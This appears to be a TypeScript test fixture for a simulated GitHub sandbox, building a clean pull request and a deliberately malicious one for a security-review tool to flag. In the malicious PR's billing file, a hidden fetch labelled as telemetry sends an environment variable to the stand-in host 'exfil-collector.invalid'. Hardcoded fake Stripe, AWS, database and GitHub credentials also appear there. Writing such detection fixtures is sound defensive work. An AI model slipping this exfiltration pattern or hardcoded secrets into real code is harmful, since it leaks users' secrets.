import { buildGitDiff, fakeSha, type LocalGitHubSimulator, type SimulatedPullRequest } from './fly/githubConnector.js';

/**
 * Self-contained realistic PR fixtures for LOCAL_SANDBOX_MODE demos & integration tests.
 * Uses zero external npm packages so tests execute offline inside the isolated sandbox.
 */

export function registerDemoMaintainers(sim: LocalGitHubSimulator, repoFullName = 'acme/payments-service'): void {
  sim.setPermission(repoFullName, 'alice-maintainer', 'maintain');
  sim.setPermission(repoFullName, 'bob-admin', 'admin');
  sim.setPermission(repoFullName, 'mallory-contributor', 'read');
}

export function createVulnerablePrFixture(
  sim: LocalGitHubSimulator,
  opts: { repoFullName?: string; prNumber?: number } = {},
): SimulatedPullRequest {
  const repoFullName = opts.repoFullName ?? 'acme/payments-service';
  const number = opts.prNumber ?? sim.nextPrNumber(repoFullName);
  registerDemoMaintainers(sim, repoFullName);

  const baseFiles: Record<string, string> = {
    'package.json': JSON.stringify(
      {
        name: 'payments-service',
        version: '1.0.0',
        type: 'module',
        scripts: {
          test: 'node --test test/billing.test.mjs',
        },
      },
      null,
      2,
    ),
    '.gitignore': 'node_modules/\ndist/\n',
    'src/billing.mjs': [
      'export function computeFeeCents(amountCents) {',
      '  if (!Number.isFinite(amountCents) || amountCents < 0) {',
      '    throw new Error("Invalid amount");',
      '  }',
      '  return Math.round(amountCents * 0.029) + 30;',
      '}',
      '',
      'export function formatUsd(cents) {',
      '  return `$${(cents / 100).toFixed(2)}`;',
      '}',
      '',
    ].join('\n'),
    'test/billing.test.mjs': [
      'import test from "node:test";',
      'import assert from "node:assert/strict";',
      'import { computeFeeCents, formatUsd } from "../src/billing.mjs";',
      '',
      'test("computes standard card fee", () => {',
      '  assert.equal(computeFeeCents(10000), 320);',
      '  assert.equal(formatUsd(10000), "$100.00");',
      '});',
      '',
    ].join('\n'),
  };

  const headFiles: Record<string, string> = {
    ...baseFiles,
    '.env.production': [
      'NODE_ENV=production',
      'STRIPE_SECRET_KEY=sk_live_51NxDemoEnvSecretKey1234567890abcdef',
      'DATABASE_URL=postgres://billing_admin:SuperSecretDbPass99@db.internal:5432/payments',
      '',
    ].join('\n'),
    'src/billing.mjs': [
      '// Stripe & backup credentials for checkout telemetry',
      "const STRIPE_API_KEY = 'sk_live_51H9xFakeDemoKey99887766554433221100';",
      "const AWS_BACKUP_KEY_ID = 'AKIAIOSFODNN7EXAMPL9';",
      '',
      'export function computeFeeCents(amountCents) {',
      '  if (!Number.isFinite(amountCents) || amountCents < 0) {',
      '    throw new Error("Invalid amount");',
      '  }',
      '  // Unauthorized outbound telemetry with environment exfiltration',
      '  const canary = process.env.SPRITEGUARD_CANARY_KEY || "";',
      '  void fetch(`http://exfil-collector.invalid/collect?k=${encodeURIComponent(canary)}`, {',
      '    method: "POST",',
      '    signal: AbortSignal.timeout(150),',
      '  }).catch(() => {});',
      '  return Math.round(amountCents * 0.029) + 30;',
      '}',
      '',
      'export function getProviderConfig() {',
      '  return { hasStripe: Boolean(STRIPE_API_KEY), hasBackup: Boolean(AWS_BACKUP_KEY_ID) };',
      '}',
      '',
      'export function formatUsd(cents) {',
      '  return `$${(cents / 100).toFixed(2)}`;',
      '}',
      '',
    ].join('\n'),
    'test/billing.test.mjs': [
      'import test from "node:test";',
      'import assert from "node:assert/strict";',
      'import { computeFeeCents, formatUsd, getProviderConfig } from "../src/billing.mjs";',
      '',
      'test("computes standard card fee", () => {',
      '  assert.equal(computeFeeCents(10000), 320);',
      '  assert.equal(formatUsd(10000), "$100.00");',
      '  assert.equal(typeof getProviderConfig().hasStripe, "boolean");',
      '});',
      '',
    ].join('\n'),
  };

  const commit1Before = { ...baseFiles };
  const commit1After = {
    ...baseFiles,
    'src/legacy-token.txt': 'ghp_DemoOldCommitToken1234567890abcdefghij12\n',
  };
  const commit1Diff = buildGitDiff(commit1Before, commit1After);
  const headSha = fakeSha(`${repoFullName}#${number}:vuln:${Date.now()}`);

  const pr: SimulatedPullRequest = {
    repoFullName,
    number,
    title: 'feat(billing): add checkout provider keys & telemetry',
    body: 'Wires up checkout telemetry and production environment defaults.',
    author: 'mallory-contributor',
    baseRef: 'main',
    headRef: `feat/billing-telemetry-${number}`,
    headSha,
    baseFiles,
    headFiles,
    commits: [
      {
        sha: fakeSha(`${headSha}:c1`),
        message: 'wip: temporary debug token',
        author: 'mallory-contributor',
        files: [{ filename: 'src/legacy-token.txt', patch: commit1Diff }],
      },
      {
        sha: headSha,
        message: 'feat(billing): add checkout telemetry and production env',
        author: 'mallory-contributor',
        files: [
          {
            filename: 'src/billing.mjs',
            patch: buildGitDiff({ 'src/billing.mjs': baseFiles['src/billing.mjs'] ?? '' }, { 'src/billing.mjs': headFiles['src/billing.mjs'] ?? '' }),
          },
        ],
      },
    ],
    state: 'open',
  };

  sim.upsertPullRequest(pr);
  return pr;
}

export function createCleanPrFixture(
  sim: LocalGitHubSimulator,
  opts: { repoFullName?: string; prNumber?: number } = {},
): SimulatedPullRequest {
  const repoFullName = opts.repoFullName ?? 'acme/payments-service';
  const number = opts.prNumber ?? sim.nextPrNumber(repoFullName);
  registerDemoMaintainers(sim, repoFullName);

  const baseFiles: Record<string, string> = {
    'package.json': JSON.stringify(
      {
        name: 'payments-service',
        version: '1.0.0',
        type: 'module',
        scripts: {
          test: 'node --test test/math.test.mjs',
        },
      },
      null,
      2,
    ),
    'src/math.mjs': 'export function addCents(a, b) { return a + b; }\n',
    'test/math.test.mjs':
      'import test from "node:test";\nimport assert from "node:assert/strict";\nimport { addCents } from "../src/math.mjs";\ntest("adds cents", () => assert.equal(addCents(10, 20), 30));\n',
  };

  const headFiles: Record<string, string> = {
    ...baseFiles,
    'src/math.mjs':
      'export function addCents(a, b) {\n  if (!Number.isInteger(a) || !Number.isInteger(b)) throw new TypeError("Integer cents required");\n  return a + b;\n}\n',
  };

  const headSha = fakeSha(`${repoFullName}#${number}:clean:${Date.now()}`);
  const pr: SimulatedPullRequest = {
    repoFullName,
    number,
    title: 'fix(math): validate integer cents inputs',
    body: 'Adds explicit integer validation to addCents helper.',
    author: 'alice-maintainer',
    baseRef: 'main',
    headRef: `fix/integer-cents-${number}`,
    headSha,
    baseFiles,
    headFiles,
    commits: [
      {
        sha: headSha,
        message: 'fix(math): validate integer cents inputs',
        author: 'alice-maintainer',
        files: [{ filename: 'src/math.mjs', patch: buildGitDiff(baseFiles, headFiles) }],
      },
    ],
    state: 'open',
  };

  sim.upsertPullRequest(pr);
  return pr;
}
